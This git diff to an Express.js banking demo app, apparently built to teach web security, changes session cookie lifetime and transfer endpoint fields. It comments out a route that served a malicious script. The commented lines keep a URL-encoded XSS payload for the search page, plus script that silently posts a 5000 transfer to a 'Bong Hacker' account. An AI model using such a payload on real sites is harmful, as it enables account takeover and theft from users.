@@ -21,7 +21,7 @@ app.use(
     name: "app",
     resave: true,
     saveUninitialized: true,
-    cookie: { maxAge: 60000 } // 60 seconds
+    cookie: { maxAge: ONE_HOUR_MS }
   })
 );
 
@@ -48,11 +48,11 @@ app.get('/user', (req, res) => {
 });
 
 
-// http://localhost:3000/search?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost:3000%2Fhacker.com%2Fxss.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3E
-app.get('/hacker.com/xss.js', (req, res) => {
-  res.set('Content-Type', 'application/javascript');
-  res.send (`const body=new URLSearchParams('amount=5000&description=Thank%20You&to=Bong%20Hacker');fetch('/transfer',{body,method:'post'})`)
-})
+// // http://localhost:3000/search?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost:3000%2Fhacker.com%2Fxss.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3E
+// app.get('/hacker.com/xss.js', (req, res) => {
+//   res.set('Content-Type', 'application/javascript');
+//   res.send (`const body=new URLSearchParams('amount=5000&description=Thank%20You&to=Bong%20Hacker');fetch('/transfer',{body,method:'post'})`)
+// })
 
 app.get('*', (req, res) => {
   res.redirect('/');
@@ -93,21 +93,22 @@ app.use((req, res, next) => {
 });
 
 app.post('/transfer', (req, res) => {
-  const { amount, description, to, date } = req.body;
+  console.log(req.body);
+  const { amount, remark, username } = req.body;
   const floatAmount = parseFloat(amount);
 
   if (
     isNaN(floatAmount) ||
     floatAmount <= 0 ||
-    description == null ||
-    description == '' ||
-    to == null ||
-    to == ''
+    remark == null ||
+    remark == '' ||
+    username == null ||
+    username == ''
   ) {
     return res.status(400).end();
   }
 
-  const updatedUser = db.makeTransfer(req.user, floatAmount, to, description);
+  const updatedUser = db.makeTransfer(req.user, floatAmount, username, remark);
   if (updatedUser === false) {
     return res.status(401).json({ error: "You don't have enough balance.", success: false });
   }
